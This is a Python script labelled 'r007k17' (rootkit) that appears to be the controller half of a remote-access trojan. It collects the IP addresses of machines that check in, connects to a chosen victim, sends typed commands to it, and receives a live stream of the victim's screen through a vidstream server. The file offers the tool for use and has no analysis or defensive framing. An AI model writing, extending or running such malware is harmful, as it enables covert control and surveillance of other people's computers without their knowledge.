import socket
import os
from vidstream import StreamingServer
import threading


print("###################################")
print("##### r007k17 by 7r1574n n13l #####")
print("###################################")

ipToConnect = str()
ipHost = "192.168.1.48"


def command(commandToExecute):
    global ipToConnect
    if commandToExecute[0:8] in ("connect ", "connexion", "connecter", "co"):
        ipToConnect = commandToExecute[8:len(commandToExecute)]
    elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
        getIp()
    elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
        listIp()
        command(input(">"))
    else:
        print("Error")
        command(input(">"))


def getIp():
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind((ipHost, 22227))
    serverSocket.listen()
    (clientConnected, clientAddress) = serverSocket.accept()
    print("Connection acquired from %s:%s" % (clientAddress[0], clientAddress[1]))
    serverSocket.close()
    add(clientAddress[0])
    command(input(">"))


def add(ipToAdd):
    f = open("ListIp.txt", "a")
    f.write(ipToAdd + "\n")
    f.close()


def listIp():
    f = open("ListIp.txt", "r")
    lines = f.readlines()
    for line in lines:
        print(line)
    f.close()
    command(input(">"))


def screenStop():
    global receiver
    receiver.stop_server()


command(input(">"))


ip = ipToConnect
port = 22223
run = True

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip, port))


receiver = StreamingServer(ipHost, 22224)
t = threading.Thread(target=receiver.start_server)
t.start()


def sendData(data):
    global run
    if data == "die":
        client.send(data.encode())
        run = False
    elif data == "screenStart":
        client.send("screen".encode())
    elif data == "screenStop":
        screenStop()
    else:
        client.send(data.encode())


while run == True:
    dataToSend = input("%s>" % (ip))
    sendData(dataToSend)
